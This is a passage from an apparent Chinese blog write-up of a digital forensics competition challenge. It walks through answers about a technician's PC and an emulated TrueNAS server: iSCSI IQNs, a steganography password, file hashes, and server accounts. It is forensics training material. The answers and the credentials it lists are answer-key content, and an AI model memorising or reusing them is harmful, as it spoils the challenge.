title="question13√"></a>question13√</h2><p>据技术人员交代，其电脑连接过nas服务器，请给出该nas服务器的iqn名称？[答案格式:iqn.xxx]</p><p>其实这题在<code>NAS</code>服务器那边会更好得到答案，这里我采用暴力搜索的方式直接在技术人员的镜像文件里面搜索</p><p>果然是在<code>NAS</code>服务器会更好找到，先找到<code>nas</code>的全局配置，再找到目标</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108001033040.png" alt="image-20251108001033040"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108001103131.png" alt="image-20251108001103131"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iqn<span class="number">.2005</span>-<span class="number">10.</span>org.freenas.ctl:windows</span><br></pre></td></tr></table></figure><h2 id="question14"><a href="#question14√" class="headerlink" title="question14√"></a>question14√</h2><p>分析技术人员电脑，请给出该技术人员使用的隐写工具名称？[答案格式:xx]</p><p>这个实际上隐写工具应该是没在电脑上，只能看一些记录，发现这个<code>oursecret</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106145725235.png" alt="image-20251106145725235"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oursecret</span><br></pre></td></tr></table></figure><h2 id="question15"><a href="#question15√" class="headerlink" title="question15√"></a>question15√</h2><p>接上题，请给出使用该隐写工具隐写文件所使用的密码？[答案格式:xx]</p><p>由于隐写工具其实只有记录在该电脑上，所以密码的话也是纯找，首先我们要将查看隐藏文件开起来</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106150231455.png" alt="image-20251106150231455"></p><p>然后到<code>onedirve</code>这边有一个<code>新建文档.txt</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106150302624.png" alt="image-20251106150302624"></p><p>里面就有一个密码，该密码就是隐写密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106150318040.png" alt="image-20251106150318040"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caiwu</span><br></pre></td></tr></table></figure><h2 id="question16"><a href="#question16√" class="headerlink" title="question16√"></a>question16√</h2><p>据技术人员交代，其电脑内存过一个名为“财务流水.rar”的文件，请给出该文件的SHA-1?[答案格式:字母小写]</p><p>这题要起NAS，暂时先鸽一下。</p><p>当NAS服务一起（并且虚拟化有开），技术人员的电脑马上就会出现一个神秘E盘</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108001335601.png" alt="image-20251108001335601"></p><p>在里面会有一个神秘小视频，这个其实是隐写的东西</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108002407965.png" alt="image-20251108002407965"></p><p>还会找到一个隐写的工具</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108002444022.png" alt="image-20251108002444022"></p><p>打开后选择前面那个视频，密码输入<code>caiwu</code>，然后解除隐写</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108002547752.png" alt="image-20251108002547752"></p><p>提取出来一个财务.rar文件这个就是我们要找的文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108002651294.png" alt="image-20251108002651294"></p><p>接下来就是计算哈希中值了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108003216790.png" alt="image-20251108003216790"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108003233424.png" alt="image-20251108003233424"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ac6d658f42915bda02c13f890e47bc08b6736a24</span><br></pre></td></tr></table></figure><h1 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a>服务器取证</h1><p>做服务器取证需要用上前面<code>技术人员电脑</code>，然后使用<code>NAS</code>服务器检材起服务。</p><h2 id="前提准备火眼梭"><a href="#前提准备——火眼梭" class="headerlink" title="前提准备——火眼梭"></a>前提准备——火眼梭</h2><p>先将<code>NAS</code>的镜像文件导入到火眼中，先取点东西看看</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106233644935.png" alt="image-20251106233644935"></p><p>发现取不到啥东东</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106233740266.png" alt="image-20251106233740266"></p><h2 id="前提准备nas仿真"><a href="#前提准备——NAS仿真" class="headerlink" title="前提准备——NAS仿真"></a>前提准备——NAS仿真</h2><p>将镜像全导入到火眼仿真</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106233919961.png" alt="image-20251106233919961"></p><p>操作系统检测会检测失败系统类别，不过NAS一般都是Linux</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234016902.png" alt="image-20251106234016902"></p><p><strong>注意</strong>：由于我们在技术人员谷歌浏览器中可以看到<code>NAS</code>的<code>ip</code>为<code>192.168.91.129</code>，那我们仿真起来的服务器最好也是这个<code>ip</code>，这样就可以少配置很多东西。所以我们需要设置一下虚拟机的网络</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234453252.png" alt="image-20251106234453252"></p><p>将仅主机模式的子网设置为<code>192.168.91.0</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234548388.png" alt="image-20251106234548388"></p><p>然后<code>DHCP</code>设置为，设置完后点击应用再开启<code>NAS</code>服务器</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234619756.png" alt="image-20251106234619756"></p><p>启动起来<code>NAS</code>后就会发现NAS的<code>ip</code>和原来保持一致，这样就方便很多，接下来就是登录一下</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234922129.png" alt="image-20251106234922129"></p><p>接下来就登录进去了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235041771.png" alt="image-20251106235041771"></p><p>并且web服务也开启来了，我们在宿主机中访问<code>http://192.168.91.129/</code>就可以进入到<code>web</code>登录界面</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235210215.png" alt="image-20251106235210215"></p><p>用<code>question1</code>取到的账户和密码去登录这个就能进入到页面了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235300559.png" alt="image-20251106235300559"></p><ul><li>然后先修改一下语言，这样应该会更看得懂</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107124233005.png" alt="image-20251107124233005"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107124316316.png" alt="image-20251107124316316"></p><h2 id="question1"><a href="#question1√-3" class="headerlink" title="question1√"></a>question1√</h2><p>请分析服务器，给出NAS服务器系统账号密码？[答案格式:xx@xx]</p><p>直接先看技术人员检材中的谷歌浏览器这边，发现有个保存的账号密码<code>root</code>和<code>P@88w0rd</code>，所以<code>NAS</code>服务器系统账号密码就是这个</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106233220495.png" alt="image-20251106233220495"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@P@88w0rd</span><br></pre></td></tr></table></figure><h2 id="question2"><a href="#question2√-2" class="headerlink" title="question2√"></a>question2√</h2><p>请分析服务器，给出NAS服务器的版本信息？[答案格式:xx-xx-xx]</p><p>搭建好<code>NAS</code>服务器，进入<code>web</code>页面后登录即可看到<code>NAS</code>服务器的版本信息</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235345208.png" alt="image-20251106235345208"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrueNAS-<span class="number">13.0</span>-U4</span><br></pre></td></tr></table></figure><h2 id="question3"><a href="#question3√-2" class="headerlink" title="question3√"></a>question3√</h2><p>请分析服务器，给出NAS服务器内用户SMB的邮箱？[答案格式:xx@xx]</p><p>在web页面这边可以看到除了<code>root</code>用户外，还有一个<code>smb</code>用户</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235434577.png" alt="image-20251106235434577"></p><p>下拉就能看到它的邮箱</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235532013.png" alt="image-20251106235532013"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb@paofen.com</span><br></pre></td></tr></table></figure><h2 id="question4"><a href="#question4√-1" class="headerlink" title="question4√"></a>question4√</h2><p>请分析服务器，给出NAS服务器系统告警服务使用的邮箱？[答案格式:xx@xx]</p><p>直接定位到<code>System-&gt;Alert Services</code>这边</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235635534.png" alt="image-20251106235635534"></p><p>选择编辑</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235717050.png" alt="image-20251106235717050"></p><p>就能看到警告邮箱了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235732670.png" alt="image-20251106235732670"></p><h2 id="question5"><a href="#question5√-2" class="headerlink" title="question5√"></a>question5√</h2><p>请分析服务器，给出NAS服务器内存储池名？[答案格式:xxx]</p><p>直接定位到<code>Storage-&gt;Pools</code>就可以看到<code>vol</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235911193.png" alt="image-20251106235911193"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol</span><br></pre></td></tr></table></figure><h2 id="question6"><a href="#question6√-2" class="headerlink" title="question6√"></a>question6√</h2><p>请分析服务器，给出NAS服务器内有几个数据集和几个Zvol?[答案格式:0,0]</p><p>这题一开始也是看得懵懵的，数据集是什么，Zvol又是什么，看了wp才知道就是第五问的那个界面。</p><p>然后点击设置就会看到有<code>Zvol</code>动作，所以应该是有<code>3</code>个Zvol</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107124752720.png" alt="image-20251107124752720"></p><p>同样的会有一个数据集动作</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107124846321.png" alt="image-20251107124846321"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2,3</span><br></pre></td></tr></table></figure><h2 id="question7"><a href="#question7√-2" class="headerlink" title="question7√"></a>question7√</h2><p>请分析服务器，给出该NAS服务器存储监听IP和端口？[答案格式:192.168.1.1:8080]</p><p>这题还是不知道存储监听是什么东西，然后看视频发现是这个位置，共享模块算是存储监听</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125056795.png" alt="image-20251107125056795"></p><p>然后点到<code>Portals</code>这个位置就发现了监听</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125134136.png" alt="image-20251107125134136"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0:3260</span><br></pre></td></tr></table></figure><h2 id="question8"><a href="#question8√-2" class="headerlink" title="question8√"></a>question8√</h2><p>请分析服务器，给出NAS服务器内iSCSI目标为web的连接所使用的启动器组ID？[答案格式:xx]</p><p>还是定位到问题7的那个模块中，发现有个目标，并且目标中有个<code>web</code>组</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125303744.png" alt="image-20251107125303744"></p><p>点击编辑界面</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125328862.png" alt="image-20251107125328862"></p><p>就会发现启动容器组id</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125344894.png" alt="image-20251107125344894"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="question9"><a href="#question9" class="headerlink" title="question9?"></a>question9?</h2><p>请分析服务器，给出web服务器连接NAS服务器所使用的iqn？[答案格式:iqn.xxx]</p><p>这个感觉是偏常识题，如果找的话是没找到正确答案的。视频up认为这里是正确的</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107130630785.png" alt="image-20251107130630785"></p><ul><li>但是题目的正确答案是：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iqn<span class="number">.2005</span>-<span class="number">10.</span>org.freenas.ctl:web</span><br></pre></td></tr></table></figure><ul><li>个人认为可能确实正确答案是：<code>iqn.2005-10.org.freenas.ctl:web</code>，因为<code>iqn.1994-05.com.redhat:45a66afe8867</code>更像是<code>NAS</code>服务用来标识<code>web</code>服务的</li><li>而web服务用来连接nas服务的应该是nas的全局配置，然后加上目标<code>web</code>，也就是<code>iqn.2005-10.org.freenas.ctl:web</code></li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107131439848.png" alt="image-20251107131439848"></p><h2 id="question10"><a href="#question10√-2" class="headerlink" title="question10√"></a>question10√</h2><p>请分析服务器，给出web服务器连接NAS服务器所使用的账号和密码？[答案格式:root/123]</p><p>还是定位到问题七那个界面的<code>Authorized Access</code>这个界面</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107130426222.png" alt="image-20251107130426222"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107130452534.png" alt="image-20251107130452534"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107130458516.png" alt="image-20251107130458516"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user/202305140921</span><br></pre></td></tr></table></figure><h2 id="网站重构改web服务器密码"><a href="#网站重构改web服务器密码" class="headerlink" title="网站重构改web服务器密码"></a>网站重构改web服务器密码</h2><p>接下来就是一些<code>web</code>服务器的取证相关的题目了，但是这题比较坑点的地方就是<code>web</code>服务器没有启动，并且可能还涉及到嵌套虚拟化，也就是<code>NAS</code>这个服务器如果使用<code>VMware</code>仿真的话就需要开启<code>vt虚拟化了</code>。（对于我来说这里真比较恶心，因为我基本上现在转wsl2了，所以虚拟机开不了VT虚拟化，需要把Windows的那个虚拟化给关了才行QAQ），因为之前用qemu的时候有研究过这些东西所以对虚拟化还是比较了解的。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107132105785.png" alt="image-20251107132105785"></p><p>接下来先关机开个虚拟化（不过还有个比较难绷的点就是Windows的那个虚拟化会改变机器码，导致虚拟化后取证软件全部要重新认证））</p><p>启动<code>vt</code>虚拟化，顺便把处理器数量之类的拉高一点要不然嵌套虚拟化会导致虚拟机很卡。</p><p><img 